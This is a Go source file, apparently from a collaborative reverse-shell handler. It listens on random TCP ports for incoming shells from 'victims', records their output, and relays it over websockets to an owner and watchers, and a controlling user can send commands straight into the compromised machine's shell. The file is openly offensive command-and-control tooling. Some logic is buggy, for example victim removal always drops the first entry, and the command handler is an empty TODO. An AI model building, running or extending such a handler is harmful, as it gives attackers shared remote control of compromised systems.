package main

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"math/rand"
	"net"
)

type App struct {
	HostIP   string
	Ports    []bool //已经占用的端口
	HighPort int    //最高端口
	LowPort  int    //最低端口
	Victims  []*Victim
}

func (app *App) createNewTCPConnection() (net.Listener, error) {
	port := rand.Intn(app.HighPort-app.LowPort) + app.LowPort
	for ok := true; ok; ok = app.Ports[port] {
		port = rand.Intn(app.HighPort-app.LowPort) + app.LowPort
	}
	//筛选出未被占用的端口
	app.Ports[port] = true //占用端口
	tcpListener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	return tcpListener, nil
}

type Victim struct {
	RemoteHost         string
	ListenPort         int
	ControlKey         string
	WatchKey           string
	History            string
	TCPConnection      net.Conn
	IsTCPConnectedChan chan bool
	IsTCPConnected     bool

	Users []*User
	Owner *User //当Owner关闭连接时所有用户统统关闭连接
}

func (v *Victim) Close() {
	v.TCPConnection.Close()
	for _, user := range v.Users {
		user.WSConn.Close()
	}
	for _, victim := range app.Victims {
		if victim == v {
			app.Victims = append(app.Victims[:0], app.Victims[1:]...)
			break
		}
	}
}
func (v *Victim) SendNoticeMessage(message string) {
	v.Owner.WSConn.WriteJSON(gin.H{"type": 2, "data": message})
	for _, user := range v.Users {
		user.WSConn.WriteJSON(gin.H{"type": 2, "data": message})
	}
}
func (v *Victim) SendShellMessage(message string) {
	v.History += message
	v.Owner.WSConn.WriteJSON(gin.H{"type": 0, "data": message})
	for _, user := range v.Users {
		user.WSConn.WriteJSON(gin.H{"type": 0, "data": message})
	}
}
func (v *Victim) TCPListenHandler() {
	if <-v.IsTCPConnectedChan {
		v.IsTCPConnected = true
		v.SendNoticeMessage("反弹shell已连接")
		for {
			buffer := make([]byte, 2048)
			read, err := v.TCPConnection.Read(buffer)
			if err != nil {
				return
			}
			data := buffer[:read]
			v.History += string(data)
			v.SendShellMessage(string(data))
		}
	}

}

type User struct {
	Control bool //0为Watcher，1为Controller
	Name    string
	IP      string
	WSConn  *websocket.Conn
	Attack  *Victim
}

func (u *User) CommandHandler(command string) {
	//TODO
}
func (u *User) Leave(v *Victim) {
	v.Users = v.Users
	v.Owner.WSConn.WriteJSON(gin.H{"type": 2, "data": fmt.Sprintf("用户%s离开了shell", u.Name)})
	for i := 0; i < len(v.Users); i++ {
		if v.Users[i] == u {
			v.Users = append(v.Users[:i], v.Users[i+1:]...)
			i--
		}
	}
	if len(v.Users) != 0 {
		for _, user := range v.Users {
			user.WSConn.WriteJSON(gin.H{"type": 2, "data": fmt.Sprintf("用户%s离开了shell", u.Name)})
		}
	}
	u.WSConn.Close()
}
func (u *User) WebSockerHandler() {
	if u.WSConn == nil {
		return
	}
	if u.Attack.History != "" {
		u.WSConn.WriteJSON(gin.H{"type": 0, "data": u.Attack.History})
	}
	if u.Control {
		for {
			if !u.Attack.IsTCPConnected {
				continue
			}
			_, buffer, err := u.WSConn.ReadMessage()
			if err != nil {
				fmt.Println(err)
				return
			}
			message := &Message{}
			err = json.Unmarshal(buffer, message)
			if err != nil {
				fmt.Println(err)
				return
			}
			switch message.Type {
			case 0: //直接给shell
				databyte := []byte(message.Data)
				u.Attack.TCPConnection.Write(databyte)
				u.Attack.SendShellMessage(message.Data)
			case 1:
				u.CommandHandler(message.Data)
			default:
				continue
			}
		}
	}
}

type Message struct {
	Type int8   `json:"type"` //0为双向的shell中信息，1为C->S的命令信息，2为S->C的通知信息
	Data string `json:"data"`
}
